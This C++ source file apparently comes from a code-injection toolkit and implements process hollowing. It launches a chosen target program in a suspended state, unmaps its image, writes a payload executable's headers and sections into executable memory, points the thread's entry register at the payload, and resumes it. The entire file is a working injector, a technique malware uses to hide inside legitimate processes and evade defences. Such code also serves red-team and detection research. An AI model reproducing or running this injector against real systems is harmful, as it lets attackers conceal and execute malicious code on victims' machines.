#include "../common.h"
#include "inj_process_hollowing.h"

//https://msdn.microsoft.com/en-us/library/windows/desktop/aa366892(v=vs.85).aspx

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

bool InjectorProcessHollowing::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	NTSTATUS err = ERROR_SUCCESS;
	DWORD fileSize = 0;
	blackbone::pe::PEImage targetModule;
	blackbone::pe::PEImage sourceModule;
	blackbone::Process targetProc;
	blackbone::Native *magicNativeCalls = nullptr;
	PVOID localPayloadBuff = nullptr;
	PIMAGE_DOS_HEADER pDosH = { 0 };
	PIMAGE_NT_HEADERS pNtH = { 0 };
	PIMAGE_SECTION_HEADER pSecH = { 0 };
	uint8_t hdrNt32[sizeof(IMAGE_NT_HEADERS64)] = { 0 };
	ULONGLONG localPayloadImageBase = 0;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;
	std::wcout << L"[+] Attaching to target process and parsing source payload" << std::endl;

	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetModule))
	{
		std::wcout << L"[+] Checking for valid injection context" << std::endl;
		if (InjectorHelpers::IsValidInjectionTarget(sourceModule, targetModule))
		{
			std::wcout << L"[+] Getting payload size" << std::endl;
			if ((InjectorHelpers::GetFileToInjectSize(codeToInject, fileSize)) && 
				(fileSize > 0) )
			{
				std::wcout << L"[+] Payload size is " << fileSize << L" bytes" << std::endl;
					
				std::wcout << L"[+] Now creating target process in suspended state: " << targetToInject << std::endl;

				if((InjectorHelpers::CreateSuspendedProcess(targetToInject, si, pi)) &&
					(targetProc.Attach(pi.dwProcessId) == ERROR_SUCCESS))
				{					
					std::wcout << L"[+] Success creating process in suspended state, now allocating space for payload and filling it" << std::endl;
					localPayloadBuff = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 

					DWORD bytesRead = 0;
					if ((localPayloadBuff) && 
						(InjectorHelpers::ReadFileToInjectInBuffer(codeToInject, fileSize, localPayloadBuff, bytesRead)) &&
						(bytesRead == fileSize))
					{
						std::wcout << L"[+] Local buffer is now filled! at 0x" << std::hex << localPayloadBuff << std::endl;
						std::wcout << L"[+] Getting stub to native calls and getting thread context" << std::endl;
						magicNativeCalls = targetProc.core().native();

						pDosH = (PIMAGE_DOS_HEADER)localPayloadBuff;
												
						if (pDosH && 
							magicNativeCalls &&
							(pDosH->e_magic == IMAGE_DOS_SIGNATURE) &&
							(NtGetContextThread(pi.hThread, &ctx) == ERROR_SUCCESS))
						{
							pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)localPayloadBuff + pDosH->e_lfanew);
							localPayloadImageBase = pNtH->OptionalHeader.ImageBase;

							std::wcout << L"[+] Succesfully got context of threadID " << pi.dwThreadId << std::endl;

							blackbone::ptr_t targetPEBBaseAddr = 0;
							if (targetProc.barrier().type == blackbone::wow_32_32)
							{
								blackbone::_PEB32 peb32 = { 0 };
								if (magicNativeCalls->getPEB(&peb32))
								{
									targetPEBBaseAddr = peb32.ImageBaseAddress;
								}
							}
							else if (targetProc.barrier().type == blackbone::wow_64_64)
							{
								blackbone::_PEB64 peb64 = { 0 };
								if (magicNativeCalls->getPEB(&peb64))
								{
									targetPEBBaseAddr = peb64.ImageBaseAddress;
								}
							}

							if (targetPEBBaseAddr != 0)
							{
								std::wcout << L"[+] Entry Point found at 0x" << std::hex << targetPEBBaseAddr << std::endl;

								//checking if image base address and payload has the same baseaddr
								if (targetPEBBaseAddr == localPayloadImageBase)
								{
									std::wcout << L"[+] Same image base addr was found, unmapping the code in targe proc" << std::endl;
									NtUnmapViewOfSection(targetProc.core().handle(), (PVOID)targetPEBBaseAddr);
								}

								//Final steps, now allocatting memory in remote process for the payload
								blackbone::module_t imageBaseAddr = sourceModule.imageBase();
								blackbone::ptr_t targetPayloadBuff = localPayloadImageBase;

								if ((magicNativeCalls->VirtualAllocExT(targetPayloadBuff, sourceModule.imageSize(),
									(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE) == ERROR_SUCCESS) &&
									(targetPayloadBuff != NULL))
								{
									std::wcout << L"[+] Memory succesfully allocated at 0x" << std::hex << sourceModule.imageBase() << std::endl;

									std::wcout << L"[+] Now writting PE sections and header to remote memory at 0x" << std::hex << sourceModule.imageBase() << std::endl;

									bool sectionsWrittingWentOK = true;
									// First write header
									if (magicNativeCalls->WriteProcessMemoryT(targetPayloadBuff, localPayloadBuff, sourceModule.headersSize()) == ERROR_SUCCESS)
									{
										//Then write sections 
										for (auto sectionsIT = sourceModule.sections().begin();
											sectionsIT != sourceModule.sections().end();
											++sectionsIT)
										{
											blackbone::ptr_t targetLocation = targetPayloadBuff + sectionsIT->VirtualAddress;
											blackbone::ptr_t sourceLocation = (((size_t)localPayloadBuff) + sectionsIT->PointerToRawData);

											std::wcout << L"[-] About to write section from payload to target location at 0x" << std::hex << targetLocation << std::endl;
											if (magicNativeCalls->WriteProcessMemoryT(targetLocation,
												(PVOID)sourceLocation,
												sectionsIT->SizeOfRawData) != ERROR_SUCCESS)
											{
												sectionsWrittingWentOK = false;
												break;
											}
										}

										if (sectionsWrittingWentOK)
										{
											//PVOID targetEntryPoint = 0;
											PVOID targetImageBasePEB = 0;
											PVOID imageBaseAddr = 0;
#ifdef _X86_
											// Set the eax register as the entry point for 32 bits
											ctx.Eax = (SIZE_T)((LPBYTE)targetPayloadBuff + pNtH->OptionalHeader.AddressOfEntryPoint);
											targetImageBasePEB = (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2));
#elif _WIN64
											// Set the rcx register as the entry point for 64 bits											
											ctx.Rcx = (SIZE_T)((LPBYTE)targetPayloadBuff + pNtH->OptionalHeader.AddressOfEntryPoint);
											targetImageBasePEB = (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2));
#endif
											std::wcout << L"[+] Now writting Entry Point and setting thread context at 0x" << std::hex << targetImageBasePEB << std::endl;
																						
											if ((targetImageBasePEB) &&
												(magicNativeCalls->WriteProcessMemoryT((blackbone::ptr_t)targetImageBasePEB,
												 &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL) == ERROR_SUCCESS) &&
												(NtSetContextThread(pi.hThread, &ctx) == ERROR_SUCCESS))
											{
												std::wcout << L"[+] Almost ready! Entry point was written at 0x" << std::hex << targetImageBasePEB << std::endl;
												
												std::wcout << L"[+] Resuming the thread" << std::endl;

												if (NtResumeThread(pi.hThread, NULL) == ERROR_SUCCESS)
												{							
													std::wcout << L"[+] Success! Code injected via Hasherezade InjectorProcessHollowing method" << std::endl;
													ret = true;							
												}
												else
												{
													std::wcout << L"[-] There was a problem resuming the thread!" << std::endl;
													targetProc.Terminate();
												}
											}
											else
											{
												std::wcout << L"[-] There was a problem writting target entry point" << std::endl;
												targetProc.Terminate();
											}
										}
										else
										{
											std::wcout << L"[-] There was a problem writting sections into remote process" << std::endl;
											targetProc.Terminate();
										}
									}
									else
									{
										std::wcout << L"[-] There was a problem allocating remote memory for the payload" << std::endl;
										targetProc.Terminate();
									}								
								}
								else
								{
									std::wcout << L"[-] There was a problem allocating remote memory for the payload" << std::endl;
									targetProc.Terminate();
								}
							}
							else
							{
								std::wcout << L"[-] There was a problem getting the image base address" << std::endl;
								targetProc.Terminate();
							}
						}
						else
						{
							std::wcout << L"[-] There was a problem with target thread" << std::endl;
							targetProc.Terminate();
						}

						if (localPayloadBuff)
						{
							VirtualFree(localPayloadBuff, fileSize, MEM_RELEASE);
						}

						NtClose(pi.hThread);
						NtClose(pi.hProcess);
					}
					else
					{
						std::wcout << L"[-] There was a problem allocating local buff" << std::endl;
						targetProc.Terminate();
					}
				}
				else
				{
					std::wcout << L"[-] There was a problem creating target process in suspended state" << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] There was a problem getting file size data" << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem validating injection target" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	return ret;
}